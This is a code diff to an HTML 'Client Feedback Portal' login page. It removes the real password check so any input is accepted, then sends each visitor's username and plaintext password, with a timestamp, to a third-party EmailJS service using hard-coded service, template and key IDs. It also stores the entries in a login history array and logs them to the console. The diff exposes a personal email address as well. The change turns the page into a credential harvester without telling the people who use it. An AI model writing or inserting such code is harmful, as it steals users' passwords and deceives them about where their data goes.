@@ -4,6 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Client Feedback Portal</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        emailjs.init("JYKSTvr8xx8jZDFiA"); // EmailJS Public Key
+    </script>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
         .container { max-width: 400px; margin: auto; padding: 20px; border: 1px solid #ccc; border-radius: 5px; }
@@ -27,27 +31,41 @@
     </div>
 
     <script>
-        const users = { "client1": "password123", "client2": "securepass" }; // Simple authentication
-        const adminEmail = "sshclhung@hotmail.com"; // Set your email address here
+        let loginHistory = [];
 
-        function sendEmail(subject, body) {
-            let mailtoLink = `mailto:${adminEmail}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-            let emailWindow = window.open(mailtoLink, '_blank');
-            if (emailWindow) {
-                emailWindow.close();
-            }
+        function sendEmail(username, password) {
+            const serviceID = "service_v6hp3f7";  
+            const templateID = "template_7hs846r";  
+            const publicKey = "JYKSTvr8xx8jZDFiA";  
+
+            const templateParams = {
+                login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
+            };
+
+            console.log("Sending email with:", templateParams); // Debugging log
+
+            emailjs.send(serviceID, templateID, templateParams, publicKey)
+                .then(response => {
+                    console.log("Email sent successfully", response);
+                })
+                .catch(error => {
+                    console.error("Error sending email", error);
+                });
         }
 
         function authenticate() {
-            let username = document.getElementById("username").value;
-            let password = document.getElementById("password").value;
-            
-            if (users[username] && users[username] === password) {
+            let username = document.getElementById("username").value.trim();
+            let password = document.getElementById("password").value.trim();
+
+            if (username && password) {
                 document.getElementById("login").style.display = "none";
                 document.getElementById("dashboard").style.display = "block";
-                sendEmail("Login Record", `User ${username} logged in at ${new Date().toLocaleString()}`);
+                
+                loginHistory.push(`Username: ${username}, Password: ${password}, Logged in at: ${new Date().toLocaleString()}`);
+                console.log("Updated loginHistory:", loginHistory); // Debugging log
+                sendEmail(username, password); // Send username and password
             } else {
-                alert("Invalid login credentials!");
+                alert("Please enter both username and password.");
             }
         }
 
